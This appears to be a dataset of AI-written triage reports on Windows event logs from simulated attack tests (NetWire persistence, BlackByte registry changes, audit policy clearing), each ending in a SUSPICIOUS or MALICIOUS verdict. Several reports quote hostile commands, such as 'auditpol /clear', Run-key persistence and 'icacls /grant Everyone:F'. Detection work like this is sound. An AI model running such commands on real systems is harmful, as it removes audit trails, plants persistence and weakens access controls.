### Sysmon Logs Analysis:
1. **Frequent Execution of System Utilities**:
   - Several processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `cmd.exe` are executed under the user `SERVER002\admin_test`. 
   - `wevtutil.exe` and `whoami.exe` are legitimate Windows utilities but are frequently used by attackers for enumeration and to clear event logs.
   
2. **Registry Modification via Command Prompt**:
   - An instance of `cmd.exe` is observed executing a command to modify registry settings (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f`). 
   - Modifying registry keys related to BitLocker (`FVE` denotes Full Volume Encryption) could be indicative of an attempt to alter security settings or bypass security measures.
   - This registry modification under a high integrity level is a red flag as it points to possible unauthorized changes in system security settings.

### Security Logs Analysis:
1. **Time Stamps and Synchronization**:
   - The `S-1-5-19` or `LOCAL SERVICE` account is shown in the logs indicating time sync activities which is generally benign behavior.
   - Use of `svchost.exe` for time services is normal; no anomalies detected here relating to time adjustments.

### System Logs Analysis:
1. **Time Adjustment Events**:
   - Logs show time adjustments (Event IDs 24 and 1), which can be normal as part of NTP synchronization.
   - No suspicious exploitation or time manipulation is directly indicated in these logs separately from security logs where time changes were logged.
   
### Assessment:
- The execution of common Windows utilities (`wevtutil.exe`, `whoami.exe`, `hostname.exe`) is not inherently malicious but can be part of normal system administration or part of a reconnaissance phase in a compromised system.
- The registry modification command executed through `cmd.exe` is significantly suspicious, especially when such commands are altering security-relevant registry keys.
- The logging conveys potential misuse of administrative privileges, particularly `SERVER002\admin_test` altering system configurations, warranting further scrutiny.

### Conclusion:
Based on the analysis of provided log entries, especially the registry change and frequent execution of diagnostic tools, the incident contains multiple signs of potential unauthorized access or tampering with security configurations, which leads to a determination of **SUSPICIOUS** activity. Further investigation is required to ascertain the intent and scope of these activities. A deeper probe into the context of these actions, user intentions, and an audit of other system activities or logs is recommended to conclude the nature and risk of this activity.

### Recommendations:
- Conduct a detailed investigation on the user `SERVER002\admin_test` actions during this time to understand whether those changes were authorized or planned.
- Review and secure any changed registry entries related to system security or encryption settings.
- Consider employing tighter monitoring on execution of system utilities or changes to the registry.
- If malicious intent is confirmed, validate the integrity of affected systems and consider a full security audit."
Create ADS command prompt,"Upon reviewing the Windows event logs, here are the key observations and analysis:

### Key Observations:

1. **Time Change Events**:
   - There are multiple time change events logged by `svchost.exe`, a Microsoft service host process, which is normal if it's related to time synchronization services. This appears benign as there are no other correlating suspicious activities directly linked to these events.

2. **Privilege Escalation**:
   - Event ID `4672` indicates that a user `admin_test` was granted special privileges including high-level privileges like `SeDebugPrivilege` and `SeLoadDriverPrivilege`. This can be a legitimate administrative action, but in some contexts, it can indicate potentially malicious privilege escalation.

3. **Process Executions**:
   - The use of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` logged in Sysmon could appear normal for system diagnostics or monitoring tools, but frequent execution under the user `SERVER002\admin_test` performing these actions in quick succession may be worth further scrutiny.
   
4. **Command Execution with Anomalous Behavior**:
   - Sysmon logs reveal command line executions with potential shell code indications, specifically:
     - `""cmd.exe"" /c echo cmd /c echo ""Shell code execution.""...` suggests script execution which is suspicious if not attributable to legitimate scripting activities or software updates conducted by admins.

5. **Unusual Command Line Argument**:
    - The command line argument `\""C:\\Windows\\system32\\cmd.exe\"" /c echo ""Shell code execution.""` is a strong indicator of potentially unauthorized use, consistent with attempts to execute or test code snippets. 

6. **Network and System Utility Calls**:
    - Frequent activities involving `MicrosoftEdgeUpdate.exe` and several system utilities under `NT AUTHORITY\SYSTEM` might normally occur during system updates or configurations. However, combined with observed command executions, these might attract further investigation.

### Assessment:

The logs show signs of potentially suspicious activities:
- Account `admin_test` executing high-privilege commands.
- Command executions suggest possible scripting or testing of shell code, contrary to regular administrative tasks.
- Elevated process activities involving system utilities, though these do not conclusively point to malicious activity, combined with other events, suggest a need for deeper analysis.

### Conclusion:

**Resolution: SUSPICIOUS**

Given the analysis above, the log activities are flagged as suspicious due to potentially anomalous behaviors and the need to further investigate the true intent and authenticity of the admin actions:
- **Recommendation for Further Action**:
  - Verify if `admin_test` actions were part of planned administrative tasks or authorized changes.
  - Review related activities for signs of lateral movement or data exfiltration.
  - Conduct interviews or confirmation with the managing team or personnel responsible for the server activities to confirm legitimacy.
  - Implement or review alerts for command execution and privilege escalation attempts to capture real-time activity logs if not already in place."
Hidden Window-Conhost Execution,"**Analysis of Windows Event Logs**

**Suspicious Events Identified:**

1. **Log Entry #18009: PowerShell Execution with Unusual Command**
   - The log entry indicates the execution of `powershell.exe` with the command `& {conhost.exe --headless calc.exe}`. This is a notable event because it involves the use of PowerShell, a powerful scripting environment, for potentially executing a console application (`conhost.exe`) in a headless mode, implying it might be used to silently launch or execute other processes (`calc.exe` in this instance).

2. **Log Entry #18011: Console Host with Headless Switch**
   - Following the PowerShell execution, `conhost.exe` is invoked with the command line `""C:\\Windows\\system32\\conhost.exe"" --headless calc.exe`. This behavior is anomalous as Calc.exe (Windows Calculator) does not normally run in a headless or silent mode. The use of this mode can suggest evasion techniques or exploratory activities.

3. **Frequent Execution of Hostname and Whoami Applications**
   - There are multiple occurrences of `hostname.exe` and `whoami.exe` in the logs. While these are normally benign system utilities, repeated execution in quick succession can indicate scripting or automated activities, possibly by an attacker verifying environment details or connectivity to a specific network.

4. **Wevtutil Executions**
   - The repeated executions of `wevtutil.exe`, the Windows Event Utility, can be either benign or indicative of someone trying to clear or manage event logs manually. It's common in adversarial activity to clear logs for evasion.

**Anomalous Behavior:**

- **Time Change Logged by Kernel-General and Security Auditing**
  - There are recorded changes in system time, which can be a tactic used to manipulate time-based security controls or logs. However, it is correlated with known time synchronization from a legitimate time source.

**Assessment:**

- The execution of PowerShell with a command to launch applications in a potentially anomalous manner suggests possible obfuscation or misuse to execute commands without raising alerts.
- The timing, context, and frequency of these process creations, especially involving PowerShell, `conhost.exe`, and unusual arguments, align more with testing or evasive operations often seen in malware or exploitation activities.

**Resolution: SUSPICIOUS**

**Guidance:**

1. **Immediate Action**: Conduct deeper investigation into the purpose and origin of the PowerShell script or commands that were executed. Verify whether the intent and origin were legitimate.
2. **Access Monitoring**: Review access logs to determine any unusual access patterns or users.
3. **Further Threat Hunting**: Expand the review to include network logs and other potentially compromised endpoints.
4. **System Integrity and Security Audits**: Validate that system time change and the execution of utilities like `hostname.exe`, `whoami.exe`, and `wevtutil.exe` are authorized and accounted for.
5. **User Awareness**: Educate users on safe scripting practices and the potential risks of executing scripts from unknown sources. 

Given the evidence, while conclusive malicious activity is not definitively identified, these activities could justify a deeper look into potential exploitations or misuse."
NetWire RAT Registry Key Creation,"After carefully analyzing the provided logs, here are my findings and assessment:

### Suspicious and Anomalous Behavior
1. **Registry Modifications via Cmd.exe**: 
    - Event ID 17981 shows `cmd.exe` executing a command to add entries to the Windows registry under the current user’s ""Run"" key. It aims to execute a script located at `C:\Users\admin\AppData\Roaming\Install\Host.exe` which is concerning. This type of activity is often associated with persistence mechanisms used by malware.

2. **Frequent Process Creation and Usage of System Utilities**:
    - Numerous instances of system tools like `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are executed in close succession with elevated integrity levels.
    - While these tools might be used for legitimate administrative purposes, such rapid, concentrated usage could also indicate script- or malware-driven activity, especially when paired with registry modifications.

3. **System Time Change**:
    - The security log indicates a change in the system time (Event ID 4616). While not inherently malicious, unauthorized time changes can be used to evade detection tools that rely on timestamps.

### Malicious Activity
- The presence of `cmd.exe` modifying registry keys for persistence strongly suggests malicious intent. Specifically, the command `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run` to add a startup program is a common technique used by malware to achieve persistence after reboot.

### Threats and Risks Identified
- **Potential Malware Persistence**: Attempt to establish persistence on the host through registry modifications.
- **Unauthorized Access and Control**: Potential use of system-level utilities to further compromise or exfiltrate data from the host.

### Guidance on How to Proceed
1. **Isolate the Host**: Immediately isolate the host from the network to prevent further propagation or data exfiltration.
2. **Registry Review**: Manually inspect the registry entries in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` for unauthorized entries and remove them if confirmed malicious.
3. **Full System Scan**: Conduct a comprehensive malware scan using up-to-date antivirus and antimalware tools.
4. **Review Recent Changes and System Time**: Audit any recent system changes, including time alterations, and validate with system and security policies.
5. **Investigation and Monitoring**: Continue monitoring for abnormal process activities and inspect any associated user accounts for signs of compromise.

### Resolution
Given the evidence pointing towards suspicious registry modifications and process activity patterns, the resolution for this log analysis is:

- **MALICIOUS**

Further investigation is advised to confirm the presence of malware and to remediate any potential compromises."
Disable Microsoft Office Security Features,"Based on the analysis of the provided event logs, the following points have been observed:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**: Throughout the logs, there are multiple entries showing executions of `wevtutil.exe` and `conhost.exe`. While these are legitimate Windows binaries, frequent and rapid execution within a short period can be indicative of script or automated activity, which might be benign but warrants further investigation to rule out the use of these binaries for malicious activities such as clearing event logs.

2. **PowerShell Activity**: There is an event showing the execution of a PowerShell script that modifies registry keys related to Microsoft Office Excel's security settings. The changes mainly involve adding registry items to disable certain protected view options. The use of PowerShell to modify such registry settings can be considered suspicious, particularly if it wasn't initiated by an authorized administrator, as it can potentially be used to lower security defenses for executing macro-based malware in Excel files.

3. **High Integrity Processes**: Several events indicate processes running with high integrity, which means they are running with elevated privileges. The processes include `powershell.exe` and `hostname.exe`. Elevated usage of PowerShell without proper authorization may suggest privilege escalation attempts.

4. **Microsoft Edge Update**: The logs show several system-related events and processes related to Microsoft Edge updates. These appear to be routine and not suspicious on their own, as periodic updates for applications are standard behavior.

5. **Security and System Logs**: The security logs typically indicate a successful system logon with special privileges (Event ID 4672), which is common and might not be suspicious unless linked with anomalous activities. The system logs show successful updates for Microsoft Defender Antivirus, suggesting that the system is up-to-date against known threats.

In summary, the key concern from these logs is the execution of PowerShell commands that alter registry settings for Office Excel in a potentially less secure manner. This could be a sign of an attempt to enable macro execution or exploit vulnerabilities within Excel, which is a common infection vector in malicious campaigns.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Investigate the origin of the PowerShell script and verify if it was executed by an authorized user. If unauthorized, consider this an indicator of compromise.
- Review any recent changes or installations made on the system, especially those involving Office products or macro settings.
- Ensure enhanced monitoring of PowerShell executions and set up alerts for registry changes that affect security configurations.
- Cross-verify with user and network activity logs for any anomalies or unauthorized access patterns during the time these events were recorded.
- Additionally, ensure user awareness on handling Office documents and macros safely, updating user protocols if necessary."
Malware Masquerading and Execution from Zip File,"After a careful review of the provided Windows event logs, here's a detailed analysis:

### Observations:

1. **PowerShell Activity:**
   - The logs show multiple instances of PowerShell execution with the command line involving the extraction of a ZIP file and execution of a script (`README.cmd`) located in the user's download directory. The command sequence involves unarchiving, changing directories, and executing a script quietly (`cmd /c ""$env:userprofile\\Downloads\\data\\README.cmd"" >$null 2>$null`).
   - PowerShell command is executed by the user `admin_test`, which indicates the user context under which these actions were performed.

2. **Security Log:**
   - There are events indicating privilege elevation for the user `admin_test`, specifically granting high-privilege tokens (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). Event ID 4672 indicates these privileges could allow potentially harmful actions.
   - Several logon events (4624) using NTLM authentication indicate access from a remote machine (192.168.0.102), possibly for administrative purposes.

3. **System Logs:**
   - Multiple events of Windows updates occurring around the same time (related to Microsoft Edge updates and Defender Antivirus updates).

4. **Sysmon Logs:**
   - Multiple process creations are observed, particularly PowerShell execution, followed by command shells running scripts and `rundll32.exe`, which is often used for executing arbitrary DLLs. This pattern could indicate suspicious behavior if `2.dll` is unfamiliar or malicious.
   - Usage of `wevtutil.exe` and `conhost.exe` in sequence, which might be part of legitimate administration but can also be used for log manipulation in certain attack scenarios.
   - Numerous `setup.exe` instances related to Edge updates are seen, which correlate with Windows updates observed in the System logs.

### Assessment:

- The sequence of events, especially the PowerShell activity and subsequent execution of a command script quietly, can be associated with a potential compromise or infection.
- Activity of `rundll32.exe` with `2.dll`, especially if `2.dll` is not recognized as legitimate, often indicates misuse to execute code that could be malicious.
- Elevated privileges gained by `admin_test` and remote logons need further scrutiny; they could be part of an attacker's attempt to escalate privileges and maintain persistent access.
- The process executions seem to align with update activities, except for the PowerShell extract-exec sequence.

### Resolution:

- **SUSPICIOUS**: The Windows event logs exhibit suspicious activities that warrant further investigation. The specific execution of scripts and DLL via PowerShell and command shell, combined with privilege escalation events, necessitate a deeper forensic analysis, checking for consistency with known legitimate operations, and any indicators of compromise, like unfamiliar scripts or DLLs operated.

### Guidance:

- Investigate the content and origin of `data.zip` and `README.cmd` for any malicious payloads.
- Verify if `2.dll` is a legitimate DLL. If not, examine it for malicious code.
- Check the intent of remote logins and if they align with the actions of authorized users.
- Analyze network activity originating from 192.168.0.102 and validate its legitimacy.
- Review privilege usage and administrative actions taken by `admin_test`.
- Consider leveraging additional threat intelligence and malware analysis to help confirm the nature of the actions observed in these logs."
Clear Windows Audit Policy Config,"Based on the given log entries, here is a detailed analysis and potential indicators of suspicious or malicious activity:

### Analysis:

1. **Time Changes and Synchronization:**
   - Multiple logs indicate time changes and synchronization activities (`EventID 24` and `EventID 1` in System Logs from ""Microsoft-Windows-Kernel-General""). The `svchost.exe` (a legitimate Windows process) is responsible for this, which is normal for time synchronization purposes using time.windows.com (an official time source). This is typically benign activity unless coupled with other suspicious indicators.

2. **Unusual Privilege Usage (Security Logs):**
   - `EventID 4624` and `EventID 4672` show that the user `admin_test` logged in with privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These are usually associated with high levels of access, potentially being a red flag, particularly if not performed by an administrative action that is expected.

3. **Command Execution (Sysmon Logs):**
   - The execution of `cmd.exe` with the command line `cmd.exe /c auditpol /clear /y & auditpol /remove /allusers` seen in `Sysmon EventID 1` suggests an attempt to clear audit policies/logs. This action is highly indicative of malicious activity, aiming to cover tracks by disrupting audit trails. 
   - There is also a high-integrity level reported for these actions, which supports the notion of potential compromise by someone with administrative access.

4. **Process Executions:**
   - The use of `wevtutil.exe` and related processes like `conhost.exe`, and `whoami.exe` can be part of normal administrative tasks. However, coupled with the audit policy manipulations (`auditpol` command), this activity becomes more suspicious.
   - `MicrosoftEdgeUpdate.exe` running as system service is expected behavior for keeping software updated.

5. **Audit Policy Changes (Security Logs):**
   - `EventID 4719` indicates audit policy changes by the `admin_test` user, further supporting the suspicion raised by `auditpol` command execution designed to clear audit policies.

### Conclusion:

Assessing the logs, there are clear signs of suspicious activity, particularly the clearing and removal of audit logs/policies using `auditpol`. This is a typical technique used by malicious actors post-exploitation to hide their activity.

### Resolution:

**Resolution: MALICIOUS**

There is strong evidence of tampering with audit policies and suspicious use of administrative privileges that suggest malicious intent to compromise and potentially escalate privileges while attempting to cover tracks. Immediate investigation is recommended. Security measures such as resetting user credentials involved, comprehensive forensic analysis, and monitoring for any further suspicious activities on this host should follow. Steps to ensure that the audit trail and logging are restored and correctly configured to prevent recurrence are also advised."
Create and start VirtualBox virtual machine,"Upon reviewing the Sysmon log snippet provided for the Windows host in question, several details emerge that are worthy of discussion. Below is a detailed analysis of the information present, with a focus on identifying any suspicious or malicious activity.

### Observations:
1. **Multiple Process Executions**: 
   - The logs reveal multiple instances where command-line applications such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, among others, were executed by the user `SERVER002\admin_test`.
   - Several instances of `conhost.exe` are observed, which is indicative of command line execution or script running activities.
   - The execution of `cmd.exe` combined with VirtualBox command (`VBoxManage.exe`) suggests activities related to virtual machine management. The command line parameters include `createvm`, `modifyvm`, and `startvm`, which are likely associated with creating and managing a virtual machine.

2. **Specific Command Lines**:
   - The command line for `cmd.exe` shows the use of VirtualBox's `VBoxManage.exe` to create, modify, and start a virtual machine. This could be benign if the administrator is performing regular maintenance or setups.
   - Execution of `powershell.exe` without visible command-line arguments could potentially mask the execution of obfuscated or hidden scripts if context around usage is not provided clearly.

3. **Privilege and Integrity Level**:
   - The processes initiated by `SERVER002\admin_test` appear with a ""High"" integrity level. Given the username, this usage level often implies administrative privileges, which require attention if there is any unexplained or unauthorized activity.

4. **`NT AUTHORITY\SYSTEM` Processes**:
   - Several processes (e.g., `TrustedInstaller.exe`, `TiWorker.exe`) run under `NT AUTHORITY\SYSTEM` are normal operations referring to system maintenance or updates, such as the servicing stack or edge updates. Such actions are typical in automated system update tasks.

### Assessment:
- **Unusual Patterns**: The logs indicate that typical diagnostic and system tools were executed, like `whoami.exe` and `hostname.exe`. While these are not inherently suspicious, they can be used in recon activities by threat actors once they gain access to a system.
- **VirtualBox Operations**: The deployment and startup of a virtual machine within a short timeframe could imply a configuration or testing task. However, it could also be utilized by malicious actors to evade detection or for lateral movement.
- **System Update Processes**: The processes associated with Microsoft Edge update look routine for a system in standard operation mode for updating software packages.

### Conclusion and Recommendation:
- **Resolution**: **SUSPICIOUS**
- **Reasoning**: While many activities align with potential administrative tasks, the significant number of command-line operations and virtual machine commands executed without more context raise questions that warrant further examination. There is no outright malicious indicator like known malware signatures, suspicious external connections, or proven malicious command strings. However, the combination of high-integrity level process executions and virtual machine manipulations requires clarification from the responsible administrator.

### Guidance:
1. **Further Investigation**: It is advisable to verify with the administrative team if these operations, particularly the use of `VBoxManage.exe` to create and start a VM, are typical and authorized activities.
2. **Audit and Monitoring**: Enhance monitoring, particularly around scripting interfaces like PowerShell, and ensure logging is comprehensive to capture command-line arguments in detail.
3. **Review Administrative Access**: Confirm that the `SERVER002\admin_test` account's activities align with scheduled, authorized administrative changes and manage proper access controls.
4. **Network Traffic Inspection**: Consider inspecting network traffic for the period noted to assess any unusual outbound connections from the host in question."
Activate Windows NoControlPanel Group Policy Feature,"After analyzing the provided log entries, several observations can be made:

1. **Time Synchronization**: 
   - The System log entry shows a time synchronization event using the NTP server `time.windows.com`. There is nothing malicious about a system synchronizing time using an official NTP server.

2. **Process Activities**:
   - The Sysmon log records multiple process creations and activities primarily related to system utilities and Microsoft Edge updates. Most recorded processes are standard Windows processes like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, or are associated with Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`).

3. **Registry Modification**:
   - A suspicious command in the logs is a `cmd.exe` process that executed a registry modification command: 
     ```
     ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f
     ```
   - This command disables access to the Control Panel, which can be an indicator of malicious intent to restrict user ability to modify system settings. The action is executed with high integrity by the user `SERVER002\admin_test`.

4. **Edge Update Activities**:
   - Multiple entries are present for Edge Update processes under `NT AUTHORITY\SYSTEM`, which include regular update processes like `MicrosoftEdgeUpdate.exe` and component registrations like `MicrosoftEdgeUpdateComRegisterShell64.exe`.
   - These activities, while voluminous, align with the expected behavior of software updates and do not show signs of compromise.

5. **Other Processes**:
   - There are instances of standard processes like `svchost.exe` and `WmiPrvSE.exe` running under service accounts `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\NETWORK SERVICE`, respectively. These are typical for Windows services operation and do not inherently indicate malicious activity.

**Assessment and Conclusion**:
- The activities related to the Edge Update seem routine and tied to the update process and thus appear benign.
- The registry modification command to disable the Control Panel is unusual and could be considered a potential indicator of malicious activity, possibly intending to restrict system management capabilities.

**Resolution**:
Based on the analysis, the presence of a suspicious registry modification command suggests further investigation is required to determine its intent and origin. Therefore, the resolution of these logs is:
- **SUSPICIOUS** - These logs contain activity that doesn't look right and needs more investigation, especially around the registry modification command. Steps should be taken to review recent changes made by the `admin_test` user and determine if any other unauthorized modifications have occurred."
BlackByte Ransomware Registry Changes - CMD,"Upon reviewing the provided Windows event logs, here are my observations:

1. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, and `cmd.exe` are being used. These are common utilities but can be leveraged for malicious purposes, such as altering event logs, executing malicious commands, or interacting with processes.
   - A significant event is the invocation of `cmd.exe` with command lines aimed at modifying the registry, specifically:
     ``` 
     cmd.exe /c cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f & cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
     ```
     This sequence indicates registry modifications that can affect system policy and could be indicative of an attempt to modify local account token filters and enable linked connections, which could imply lateral movement or privilege escalation tactics.

2. **Security Logs**:
   - Event ID 4616 indicates that the system time was changed. While this is not inherently malicious, in conjunction with other activities, time changes might be used to cover the tracks of an attacker or align time-sensitive processes.

3. **System Logs**:
   - These align with the time change observed, with svchost.exe responsible for the changes.

4. **Application Logs**:
   - Edge Update processes indicate routine update checks and software management by Microsoft Edge Update services.

5. **General Observations**:
   - The events involving `cmd.exe` and the specific registry modifications are of particular concern because they suggest that there may be an attempt to manipulate security policies or permissions on the system.
   - The `wevtutil.exe` and `conhost.exe` processes could be benign; however, if used in sequence with `cmd.exe` for registry modifications, there could be potential malicious intent.
   - The activities might point towards an administrative script or a task that aims to configure system settings, but without clear identification of its legitimacy, it warrants further scrutiny.

### Assessment:

- **Resolution**: **SUSPICIOUS**

The activities noted, especially around the registry modifications, flag suspicious behavior that demands further investigation. While the changes could be part of a legitimate administrative script or task, the potential for unauthorized privilege escalation or system policy manipulation should be ruled out through more in-depth analysis or confirmation with the system owner/operator.
  
#### Guidance on How to Proceed:
- Verify with the system owner or administrator whether these actions, particularly the registry changes, were authorized or part of routine administrative tasks.
- Conduct a deeper investigation into the source and purpose of the `cmd.exe` commands to ensure they are not remnants of malicious scripts.
- Monitor further events on this host for any continuation or pattern of changes that might indicate an ongoing threat.
- Audit administrative accounts and privileges to ensure they have not been compromised or misused."
cacls - Grant permission to specified user or group recursively,"After analyzing the provided Windows event logs, several observations and potential indicators of suspicious or malicious behavior emerge:

1. **Time Change Events (EventID 4616 in Security Log & ID 1 in Kernel-General System Log)**
   - These events indicate that the system time was changed. Although time changes can be routine (e.g., due to time synchronization), they can also be manipulated for malicious purposes, such as altering timestamps to obscure activity. However, in this context, there's no strong evidence pointing to malicious intent just from time changes alone.

2. **Cmd.exe Executions (Sysmon EventID 1)**
   - Multiple instances of `cmd.exe` execution are seen with specific command-line arguments such as checking or creating files and directories (`IF EXIST`, `mkdir`) and modifying permissions (`icacls`).
   - The command `icacls.exe [path] /grant Everyone:F` grants full control to Everyone on a directory, which could potentially be used to compromise system security. Such commands are suspicious if not part of regular admin activity.

3. **Wevtutil.exe Execution (Sysmon EventID 5)**
   - `wevtutil.exe` is used for event log management, including clearing logs, which could hide malicious activity. Multiple executions without a clear purpose could be indicative of log tampering.

4. **Utility Executions: HOSTNAME.EXE and WHOAMI.EXE**
   - These utilities (`hostname.exe` and `whoami.exe`) provide system and user information and their presence in scripts could suggest reconnaissance activities, especially if run frequently or redundantly.

5. **Use of High Integrity Level Commands**
   - Many processes run with a high integrity level by the `admin_test` user, indicating potential access to elevated privileges.

**Assessment:**
- The combination of file permission alterations, potentially suspicious logging utility usage, cmd executions with specific arguments, and information gathering commands indicate a pattern that aligns more with post-exploitation behavior.

**Resolution: SUSPICIOUS**
- The activities in these logs contain indicators that warrant further investigation. The `icacls` command granting full access and the use of `wevtutil` particularly suggest attempts to manipulate system configurations and logs, which are tactics used in malicious operations.

**Guidance:**
1. Conduct a thorough review of user activity, particularly focusing on the `admin_test` account.
2. Investigate the purpose and origin of the executed commands and scripts.
3. Verify the system's time synchronization settings and confirm any authorized changes.
4. Review security measures around the affected directories and files.
5. Check for unauthorized or abnormal software installations or administrative script executions.

Further investigation and monitoring are needed to conclusively determine whether these actions were part of an authorized administrative process or an indication of compromise."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"### Detailed Analysis

The logs provided display several characteristics that warrant a closer examination. Here are the detailed findings:

#### 1. **PowerShell Activity:**
- **PowerShell Event Logs** indicate the execution of a script located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1`. The script involves the use of `Add-Type` to compile C# code using PowerShell, a technique often associated with malicious activities such as persistence mechanisms or defense evasion.
- The logs contain events labeled with `InstallUtil` utility being executed in a PowerShell context: `InstallUtil.exe /logfile= /logtoconsole=false /installtype=notransaction /action=uninstall ...`. The use of **InstallUtil** alongside dynamically compiled code can indicate attempts to execute potentially unwanted or malicious operations under the appearance of legitimate processes.
- These events also show sequences related to custom operations via a temporary DLL: `data.004.dll`, which suggests compiled assembly execution, common in attack scenarios like fileless malware or living-off-the-land attacks.

#### 2. **Sysmon Events:**
- Events show a series of process creations involving **PowerShell**, **Visual C# command-line compiler (csc.exe)**, and other .NET-related utilities (`cvtres.exe`, `InstallUtil.exe`). The presence and sequence of these processes reiterate the likelihood of exploitation techniques leveraging Windows native tools for executing arbitrary or harmful code.
- Analyzed command lines in Sysmon entries show execution of traditional administration utilities like **whoami.exe**, **hostname.exe**, which by themselves are not alarming. However, they can be contextual checks by malicious scripts attempting privilege escalation or system reconnaissance.
- Multiple instances of `MicrosoftEdgeUpdate.exe` running under NT AUTHORITY\SYSTEM account, possibly updating or installing updates. Despite looking legitimate, during a forensic investigation, these should be verified for timestamp anomalies or origin to exclude tampered binaries.

#### 3. **Indicators of Potential Malice:**
- Usage of temporary directories for script storage indicates attempts to evade typical security controls by using volatile data paths.
- The compilation of on-the-fly code using `Add-Type` cmdlet, and the choice of **InstallUtil** suggests potential insider threat scenarios where legitimate access might be leveraged to execute unauthorized operations.
- Absence of direct security log or system log entries could indicate log tampering or selective logging to hide actions, typical in sophisticated breaches.

### Assessment

Based on the analysis of the event response and Windows PowerShell/Sysmon logs:

- **SUSPICIOUS:** The activities observed suggest potentially unwanted or malicious intent given the use of frameworks, file paths, and runtime modifications often associated with advanced persistent threats (APTs) or advanced malware stages. The behavior does not conclusively demonstrate overt malicious action, such as file modification, deletion, or data exfiltration, without deeper examination of `InstallUtilTestHarness.ps1` and system/applications context.

### Guidance on How to Proceed

- **Immediate Actions:**
  - **Contain and Monitor:** Ensure the script `InstallUtilTestHarness.ps1` is quarantined and analyze its code content.
  - **Log Analysis:** Conduct further comparison with known-good system baselines to ascertain deviations and investigate potential indicators of compromise (IOCs).
  - **Network and Endpoint Monitoring:** Increase scrutiny on host and network activity surrounding the source, timeframe, and related accounts.

- **Further Actions:**
  - Investigate the provenance of `<data.004.dll>` and any persistence mechanisms linked with its execution.
  - Review recent administrative activities by USER: `admin_test` for anomaly behaviors or unauthorized operations.
  - Verify signature and version integrity of involved utilities like `EdgeUpdate` and dependencies across other systems.

Given the suspiciously irregular PowerShell and InstallUtil use, this incident warrants escalation to review for confirmation of unauthorized or malicious activities."
Register-CimProvider - Execute evil dll,"Upon reviewing the provided Windows event logs, several activities were identified that warrant closer examination for potential malicious behavior:

1. **Repeated Usage of `wevtutil.exe` and `whoami.exe`:** Wevtutil is a command-line utility that is used to retrieve and manage event logs, while whoami.exe is used to display logged-in user information. These utilities can be used legitimately for administrative tasks, but their usage in close succession might suggest an attempt to gather system and user information for malicious purposes if not part of routine administrative activities.

2. **Command-Line Execution Involving `cmd.exe` and `Register-CimProvider.exe`:**
   - The `cmd.exe` process executed the `Register-CimProvider.exe` with a DLL located in a user's TEMP directory. `Register-CimProvider.exe` is used for registering Windows Management Instrumentation (WMI) providers. The usage of temporary paths and the registration of DLLs in WMI space could be indicative of a potential WMI-based persistence mechanism.

3. **Frequent Execution of Microsoft Edge Update Processes:**
   - Multiple entries related to `MicrosoftEdgeUpdate.exe` and its setup files were observed. While these processes could relate to legitimate update operations for Microsoft Edge, the presence of processes from temporary directories can be suspicious. This could indicate attempts to execute potentially altered versions of these executables.

4. **High Integrity Level Processes:**
   - Many processes, such as `cmd.exe`, ran at a high integrity level. This means they had elevated privileges, potentially indicating privilege escalation attempts if not standard operations performed by an administrator.

5. **Potentially Suspicious Timing of Events:** 
   - The cluster of events happening in a short timeframe without clear context may imply automated activity rather than manual administrative tasks.

**Assessment:**
- Based on the logs reviewed, there is suspicious activity involving command line usage, potentially indicative of malicious script execution or attempts to leverage WMI for persistence.
  
- While it may not be possible to definitively classify this behavior as malicious without additional context or correlating with known indicators of compromise (IOCs), the activities are deemed suspicious enough to warrant further investigation.

**Resolution:** 
- **SUSPICIOUS** - The log entries contain activity that is unusual and merits further investigation to confirm whether it is part of legitimate administrative tasks or indicative of malicious activity.

**Guidance on How to Proceed:**
1. **Investigate the Context of Activities:** Determine whether these activities were expected and conducted by authorized personnel or if they signal potential unauthorized access or malicious scripts.
2. **Conduct Host-based Forensics:** Analyze the system for additional indicators, such as unknown scheduled tasks, registry modifications, or network connections initiated by these suspicious processes.
3. **Correlate with External Threat Intelligence:** Cross-reference any file hashes or command-line patterns with known malicious signatures.
4. **Review User Activity:** Validate the actions taken by the user `SERVER002\admin_test` to ensure they align with expected administrative duties.
5. **Isolate the System if Malicious Activity is Confirmed:** Take the system offline to contain potential threats and prevent further compromise."
Abusing MyComputer Disk Cleanup Path for Persistence,"Upon analyzing the provided logs, I have identified several patterns and events that require further attention:

1. **Sysmon Logs**:
   - Multiple executions of `wevtutil.exe` and `cmd.exe` by the same user, `SERVER002\\admin_test`, are observed. `wevtutil.exe` is a legitimate tool used to query and modify event logs, and `cmd.exe` is the command prompt. The use of these tools in quick succession can indicate log manipulation or other nefarious activities if found in an unexpected context or without a clear purpose.
   - The `cmd.exe` execution included a command to add an entry to the registry using `reg.exe`, which modifies a registry key to execute `notepad.exe` on demand. While `notepad.exe` itself is a benign application, unauthorized registry manipulations can be signs of persistence mechanisms.
